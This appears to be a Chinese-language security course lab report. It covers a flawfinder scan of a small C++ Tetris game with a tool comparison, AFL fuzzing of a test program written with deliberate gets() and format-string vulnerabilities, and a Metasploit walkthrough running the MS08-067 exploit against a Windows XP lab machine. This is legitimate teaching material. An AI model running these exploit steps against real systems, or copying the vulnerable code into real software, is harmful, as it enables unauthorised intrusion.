# 239-12

1. pip安装flawfinder
2. github上面找了一个C++写的终端版俄罗斯方块小游戏tinytetris，用的注释版源码
3. 用flawfinder命令检测该项目，并将检测结果输出到一个html文件

**结果：**

1. **srand函数的随机性不足（CWE-327）**：
   - 使用`srand`函数来初始化随机数生成器。这个函数的随机性不足以用于安全相关的功能，比如密钥和一次性数字的生成。建议使用更安全的随机值获取技术，比如C++11中的`<random>`库。
2. **memcpy函数的缓冲区溢出（CWE-120）**：
   - 使用`memcpy`函数复制数据时没有检查目标缓冲区是否溢出。这意味着如果源数据大于目标缓冲区的大小，可能会导致缓冲区溢出，这是一个常见的安全漏洞。建议确保目标缓冲区总是能够容纳源数据。
3. **usleep函数的过时性（CWE-676）**：
   - 使用了`usleep`函数来暂停程序执行。这个函数被认为是过时的，并且其与`SIGALRM`信号和其他计时函数（如`sleep()`、`alarm()`、`setitimer()`和`nanosleep()`）的交互是未定义的。建议使用`nanosleep(2)`或`setitimer(2)`代替。



## flawfinder与其他代码分析工具的比较

1. **Cppcheck**：
   - 支持C和C++代码的静态分析。
   - 能够检测除编译器会检测到的错误外的其他类型错误，假阳性率较低。
   - 专注于检测**越界错误、内存泄露、语法错误**等问题。
2. **Splint**：
   - 一个针对C语言的静态分析工具不支持C++。
   - 以注释为依据进行分析，可以检测出多种编程错误。
   - 对于代码风格和**潜在的运行时错误**有较好的检测能力。
3. **TscanCode**：
   - 支持C、C++、C#和Lua代码的静态分析。
   - 提供开源版本，支持Windows、Linux和Mac OS平台。
   - 提示信息与Cppcheck相似，但给出的提示数量较少。

- **检测能力**：Cppcheck > TscanCode > Flawfinder
- **友好度**：TscanCode > Cppcheck > Flawfinder
- **易用性**：TscanCode > Cppcheck > Flawfinder

即 在检测能力、友好度和易用性上，flawfinder仍有改进的空间。且其仅仅支持c/c++的代码检测，语言的种类多样性上仍有提升空间。



# 239-15

1. WSL Ubuntu上下载AFL

2. Ubuntu用nano创建测试代码：

3. ```c
   #include <stdio.h>
   #include <stdlib.h>
   #include <unistd.h>
   #include <string.h>
   #include <signal.h>
   
   int vuln(char *str) {
       int len = strlen(str);
       if (str[0] == 'A' && len == 66) {
           // 如果输入的字符串的首字符为A并且长度为66，则异常退出
           raise(SIGSEGV);
       } else if (str[0] == 'F' && len == 6) {
           // 如果输入的字符串的首字符为F并且长度为6，则异常退出
           raise(SIGSEGV);
       } else {
           printf("it is good!\n");
       }
       return 0;
   }
   
   int main(int argc, char *argv[]) {
       char buf[100] = {0};
       gets(buf);  // 存在栈溢出漏洞。如果输入过长，则会导致栈溢出
       printf(buf);  // 存在格式化字符串漏洞.没有指定格式字符串，如果buf包含格式化指令,则会导致未定义行为
       vuln(buf);
       return 0;
   }
   ```

4. 

5. 

**流程概述：**

1. 首先是用afl-gcc编译源代码，然后以文件(最好小于1K)为输入.
2. 然后启动afl-fuzz程序，进行模糊测试，将testcase(输入的测试文件)作为程序的输入执行程序，afl会在这个testcase的基础上进行自动变异输入，使得程序产生crash，产生了crash就会被记录起来。
3. 模糊测试完成之后产生了4个crashes
4. 用xxd工具分析：
   1. `Fsdfs.`这种情况符合我们在vuln中规定的：如果输入的字符串的首字符为F并且长度为6，则异常退出。
   2. `sidfsudfhsdhfo.....`这种情况的输入数据长度为100多字节，超出了buf的长度从而导致了栈溢出错误。
   3. `Sisdh%SIUhh`这种情况的输入中包含%S这一printf输入控制符，导致了printf的错误，存在格式化字符串漏洞。
   4. `Assdsf.......`这种情况符合我们在vuln中规定的：如果输入的字符串的首字符为A并且长度为66，则异常退出。

**结果：AFL的模糊测试基本找出了我们给定代码中的一些漏洞。**



# 239-16

**步骤:**

 1. kali linux安装

 2. windows xp安装，然后手动关闭防火墙

 3. 在kali中用root启动终端，初始化并启动Metasploit：

     1. ```shell
        #显示系统中所有服务的状态
        service --status-all
        #启动并显示PostgreSQL服务
        service postgresql start
        service postgresql status
        #初始化Metasploit框架的数据库msfdb
        msfdb init
        #启动Metasploit框架的控制台界面
        msfconsole
        #在Metasploit控制台界面中执行，用于显示数据库的状态
        msf6 > db_status
        ```

 4. 获得两机的ip地址，把网络都设为bridge模式，这样才能相互ping通

 5. 开始渗透测试：

     1. kali中root模式，命令如下：

        ```shell
        use windows/smb/ms08_067_netapi
        set RHOST 172.27.83.190   # 靶机IP
        set LHOST 172.27.94.165  # Kali所在机IP
        show targets #查看支持的操作系统 得到目标操作系统为34  Windows XP SP3 Chinese - Simplified (NX)
        set Target 34 
        exploit #开始渗透
        ```

        ![image-20251221135329300](/course/image-20251221135329300.png)

        

        
